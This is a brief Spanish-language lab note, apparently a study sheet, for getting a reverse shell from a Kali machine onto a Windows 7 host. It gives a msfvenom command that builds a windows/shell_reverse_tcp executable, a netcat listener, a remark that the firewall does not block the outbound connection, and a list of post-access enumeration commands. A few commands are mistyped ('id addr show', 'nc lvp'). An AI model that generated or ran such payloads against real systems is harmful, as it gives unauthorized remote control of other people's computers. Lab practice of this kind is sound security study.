++ PC1: Kali
++ PC2: Windows 7

++ PC2: Firewall de windows apagado
--- Nota: Aún con el firewall activo el proceso puede llevarse a cabo,
esto es debido a que el firewall es capaz de bloquear tráfico de entrada más no 
de salida. Este es el caso del reverse shell: el equipo con windows se conecta al equipo con kali (tráfico de salida)
++ PC1: msfvenom -p windows/shell_reverse_tcp lhost=<ip_PC1> lport=<443> -f exe > <nombre_programa>
--- Ubicar ip de PC1 con: id addr show
++ PC1: nc lvp 443
++ PC2: iniciar el programa
++ PC1: Tendrá acceso a la línea de comandos de PC2 
--- Comandos útiles:
----- systeminfo (Nos permite ver información del S.O.)
----- net start (Nos permite ver los comandos que se están ejecutando)
----- wmic product get name,version,vendor (Nos permite ver que programas están instalados en el S.O.)
----- wmic qfe get Caption, Description (Nos permite ver las actualizaciones que están instaladas en el S.O.)
----- whoami (Permite ver el usuario activo)
----- whoami /priv (Permite ver los privilegios del usuario activo)
----- whoami /groups (Permite ver la correspondencia del usuario con los grupos)
----- dir (Permite ver la estructura de los directorios)
----- cd (Permite navegar entre los directorios)
----- arp -a (Permite ver los otros dispositivos que están en la red)
----- ipconfig (Nos permite ver la información de red del equipo)



